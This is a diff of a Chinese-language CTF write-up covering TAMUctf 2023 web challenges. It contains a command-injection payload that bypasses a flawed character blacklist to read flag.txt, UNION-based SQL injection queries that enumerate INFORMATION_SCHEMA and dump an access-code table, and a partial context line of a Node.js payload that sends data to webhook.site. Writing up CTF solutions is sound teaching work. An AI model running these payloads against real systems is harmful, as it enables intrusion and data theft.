@@ -2,7 +2,9 @@
 
 ## 前言
 
-官方 discord 地址：https://discord.com/channels/1096793565478277256/1096801776226799686
+[官方 discord 地址](https://discord.com/channels/1096793565478277256/1096801776226799686)
+
+- https://tamuctf.com/challenges#Migraine-22
 
 ## WEB
 
@@ -10,7 +12,7 @@
 
 应该是一个命令注入的题目，但是有一个黑名单过滤，不可以含有以下字符：
 
-```
+```python
 def escape_shell_cmd(data):
     for char in data:
         if char in '&#;`|*?~<>^()[]{}$\\':
@@ -21,22 +23,22 @@ def escape_shell_cmd(data):
 
 执行的命令如下，注意到返回结果中必须含有 HTTP：
 
-```
+```python
 command = "curl -s -D - -o /dev/null " + url + " | grep -oP '^HTTP.+[0-9]{3}'"
         output = os.popen(command).read().strip()
 ```
 
-看上去似乎不能命令注入了？然而过滤的代码存在逻辑的问题。
+看上去似乎不能命令注入了？然而过滤的代码存在**逻辑漏洞**。
 
-- 如果我们的第一个字符未在黑名单中，那么就直接返回 True 了。
+- **如果我们的第一个字符未在黑名单中，那么就直接返回 True 了。**
 
 所以可以利用如下 payload 简单绕过黑名单：
 
-```
+```bash
  & echo HTTP;cat flag.txt;a
 ```
 
-- 注意开头的空格，这是为了绕过黑名单。
+- 注意开头的**空格**，这是为了绕过黑名单。
 
 
 
@@ -44,13 +46,13 @@ command = "curl -s -D - -o /dev/null " + url + " | grep -oP '^HTTP.+[0-9]{3}'"
 
 页面显示要求我们输入一个用户名，如果用户名不存在于数据库中，那么会给邮箱发送一个重置密码的链接。
 
-关键的问题在于这个邮箱是什么？我们可以拿到邮箱的访问权吗？
+关键的问题在于这个邮箱是什么？我们可以拿到邮箱的访问权吗？不过从题目来看应该是不可以，所以转换一下思路。
 
-抓包发现输入一个存在的用户名会响应 exists，反之则是 not exists
+- 抓包发现输入一个存在的用户名会响应 exists，反之则是 not exists
 
 灵感一现忽然觉得可能是 SQL 注入，因为后端必然是拿我们输入的用户名带入 SQL 语句中进行了查询，这样才能判断输入的用户名是否存在于数据库中。
 
-输入单引号报错
+**输入单引号报错**
 
 ![image-20230501190742550](image-20230501190742550.png)
 
@@ -58,9 +60,7 @@ command = "curl -s -D - -o /dev/null " + url + " | grep -oP '^HTTP.+[0-9]{3}'"
 
 ![image-20230501190808334](image-20230501190808334.png)
 
-确定存在 SQL 注入，应该是盲注，
-
-经过我的尝试，应该可以根据存在或者不存在进行布尔盲注。
+确定存在 SQL 注入，应该是盲注，经过我的尝试，应该可以根据存在或者不存在进行**布尔盲注**。
 
 ```python
 import requests
@@ -285,3 +285,55 @@ process.mainModule.require('https').request({hostname: 'webhook.site',path: '/6a
 ![image-20230503110516202](image-20230503110516202.png)
 
 ![image-20230503110501862](image-20230503110501862.png)
+
+### Lost and Forgotten
+
+给了一个博客，访问这些博客需要密码。
+
+一番测试之后发现搜索功能处存在 SQL 注入漏洞：
+
+![image-20230504202951406](image-20230504202951406.png)
+
+![image-20230504203000700](image-20230504203000700.png)
+
+接下来我们要做的事情是：
+
+1. 判断列数
+2. 通过 information_schema 数据库查表名、列名
+3. 查询 flag 数据
+
+**查列数**
+
+```
+a' UNION SELECT 1,1,1,1,1,'1';#
+```
+
+**查表名：**
+
+```
+a' UNION SELECT table_name,1,1,1,1,'1' FROM INFORMATION_SCHEMA.TABLES;#
+```
+
+**查列名：**
+
+```
+a' UNION SELECT column_name,1,1,1,1,'1' FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'articles';#
+```
+
+发现 title 和 access_code 两列
+
+**查数据：**
+
+```
+a' UNION SELECT title,access_code,1,1,1,'1' FROM articles;#
+```
+
+- [参考](https://github.com/deyixtan/ctf/tree/main/challenges/tamu-ctf-2023/web-lost-and-forgotten)
+
+### Web LTO
+
+.rs 后缀，是 Rust 语言编写的代码，简单交给 ChatGPT 分析一下：
+
+![image-20230505111658168](image-20230505111658168.png)
+
+> 题目环境今天 down 掉了，比较难受吧，暂时先复现 D3。
